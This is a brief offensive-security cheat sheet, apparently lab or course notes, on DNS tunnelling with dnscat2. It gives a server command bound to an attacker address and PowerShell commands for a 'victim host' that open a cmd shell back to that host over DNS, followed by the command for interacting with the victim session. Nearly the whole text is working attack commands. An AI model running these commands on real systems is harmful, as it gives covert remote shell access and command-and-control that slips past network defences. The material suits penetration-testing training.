
## DNSCAT

https://github.com/iagox86/dnscat2


Setting up DNSCAT
```shell-session
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```

Interact with tunnel with https://github.com/lukebaggett/dnscat2-powershell

On victim host
```powershell-session
Import-Module .\dnscat2.ps1
```
```powershell-session
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```

Interacting with victim host within dnscat
```shell-session
dnscat2> window -i 1
```
